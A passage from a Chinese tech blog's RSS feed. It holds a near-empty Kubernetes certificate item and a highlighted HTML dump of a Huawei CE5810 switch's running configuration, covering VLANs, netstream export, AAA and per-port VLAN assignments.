<p>| 操作系统    | 版本                | 备注                              |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>Kubernetes的证书签发关系</title>
      <link>https://www.geekery.cn/note-book/Kubernetes/Kubernetes%E7%9A%84%E8%AF%81%E4%B9%A6%E7%AD%BE%E5%8F%91%E5%85%B3%E7%B3%BB.html</link>
      <guid>https://www.geekery.cn/note-book/Kubernetes/Kubernetes%E7%9A%84%E8%AF%81%E4%B9%A6%E7%AD%BE%E5%8F%91%E5%85%B3%E7%B3%BB.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Kubernetes的证书签发关系</source>
      <description>Kubernetes的证书签发关系 关系图 图片比较大，下载后查看 2</description>
      <pubDate>Mon, 01 Apr 2024 09:49:50 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>关系图</h2>
<blockquote>
<p>图片比较大，下载后查看</p>
</blockquote>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>Huawei-CE5810网络汇聚方案生产案例</title>
      <link>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Huawei-CE5810%E7%BD%91%E7%BB%9C%E6%B1%87%E8%81%9A%E6%96%B9%E6%A1%88%E7%94%9F%E4%BA%A7%E6%A1%88%E4%BE%8B.html</link>
      <guid>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Huawei-CE5810%E7%BD%91%E7%BB%9C%E6%B1%87%E8%81%9A%E6%96%B9%E6%A1%88%E7%94%9F%E4%BA%A7%E6%A1%88%E4%BE%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Huawei-CE5810网络汇聚方案生产案例</source>
      <description>Huawei-CE5810网络汇聚方案生产案例</description>
      <pubDate>Mon, 01 Apr 2024 09:26:52 GMT</pubDate>
      <content:encoded><![CDATA[
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[~HUAWEI]display current-configuration</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">!</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Software</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Version</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> V100R003C00SPC600</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">!</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Last</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> configuration</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> was</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> updated</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> at</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2023-09-21</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 05:46:58+00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> by</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> admin</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">!</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Last</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> configuration</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> was</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> saved</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> at</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2023-09-21</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 05:47:09+00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> by</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> admin</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sysname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> HUAWEI</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">drop-profile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vlan</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> batch</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 101</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 130</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">stp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disable</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inactive</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp-session</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> export</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> version</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> origin-as</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> export</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> template</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> timeout-rate</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> export</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> source</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168.101.102</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">netstream</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> export</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168.101.200</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2055</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">telnet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disable</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">diffserv</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> domain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">aaa</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> undo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> local-user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> policy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> security-enhance</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> local-user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> admin</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> irreversible-cipher</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $1a$fb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:J!Rwy</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">H</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$Dda</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">+.%mP.5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">L/~*JWA7R</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S!3}7[B*zMm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">{J@IYO=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">$</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> local-user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> admin</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> service-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> telnet</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> local-user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> admin</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> level</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 15</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> authentication-scheme</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> authorization-scheme</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> accounting-scheme</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> domain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> domain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default_admin</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">stack</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Vlanif1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168.101.101</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.255.0</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MEth0/0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168.0.233</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.255.0</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 101</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> qos</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lr</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cir</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 390</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mbps</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> outbound</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 102</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 103</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 104</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 105</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/6</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 106</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/7</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 107</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/8</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 108</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/9</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 109</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/10</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 110</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/11</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 111</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/12</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 112</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/13</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 113</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/14</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 114</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/15</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 115</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/16</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 116</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/17</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 117</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/18</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 118</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/19</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 119</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/20</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 120</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/21</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 121</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/22</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 122</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/23</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 123</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GE1/0/24</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 124</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
